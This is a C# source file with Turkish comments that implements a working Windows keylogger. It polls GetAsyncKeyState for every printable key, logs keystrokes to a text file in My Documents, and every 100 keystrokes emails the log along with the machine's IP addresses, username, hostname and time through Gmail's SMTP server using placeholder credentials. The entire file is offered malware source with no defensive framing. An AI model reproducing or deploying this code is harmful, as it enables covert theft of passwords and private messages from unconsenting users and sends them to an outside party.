using System.Net.Mail;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace keylogger
{
    class Program
    {
        [DllImport("User32.Dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static long numberOfKeystrokes = 0;

        static void Main(String[] args)
        {
            // My Documents klasör yolunu al
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            // Klasör yoksa oluştur
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            // keystrokes.txt dosya yolu oluştur
            string path = (filepath + @"\keystrokes.txt");

            // Dosya yoksa oluştur
            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                    // Dosya oluşturuldu, içeriği boş
                }
            }

            while (true)
            {
                Thread.Sleep(5);

                // 32 (Space) ile 126 (~) arasındaki klavye kodları için döngü
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);

                    // Tuş basıldıysa (keyState = 32768)
                    if (keyState == 32768)
                    {
                        // Klavye kodunu ilgili karaktere dönüştür ve ekrana yazdır
                        Console.WriteLine((char)i + ",");

                        // Basılan tuşu keystrokes.txt dosyasına ekle
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        numberOfKeystrokes++;

                        // 100 tuş kaydedildiyse e-posta göndermek için kontrol yap
                        if (numberOfKeystrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }
                    }
                }
            }
        } // Main fonksiyonunun sonu

        static void SendNewMessage()
        {
            // My Documents klasör yolunu al
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            // keystrokes.txt dosya yolunu oluştur
            string filepath = folderName + @"\keystrokes.txt";

            // keystrokes.txt dosyasının içeriğini oku
            String logContents = File.ReadAllText(filepath);
            string emailBody = "";

            // E-posta konusu için şu anki tarih ve saati al
            DateTime now = DateTime.Now;
            string subject = "Keylogger'dan Mesaj";

            // E-posta gövdesi için host bilgisini al
            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Adres: " + address;
            }
            emailBody += "\nKullanıcı: " + Environment.UserDomainName + "\\" + Environment.UserName;
            emailBody += "\nHost: " + host;
            emailBody += "\nZaman: " + now.ToString();
            emailBody += logContents;

            // Gmail SMTP sunucusunu kullanarak e-postayı yapılandır ve gönder
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            // Gönderen ve alıcı e-posta adreslerini ayarla
            mailMessage.From = new MailAddress("ornek@gmail.com");
            mailMessage.To.Add("ornek@gmail.com");
            mailMessage.Subject = subject;

            // Gmail SMTP sunucu ayarlarını yapılandır
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("ornek@gmail.com", "sifre");

            // E-posta gövdesini ayarla
            mailMessage.Body = emailBody;

            // E-postayı gönder
            client.Send(mailMessage);
        }
    }
}
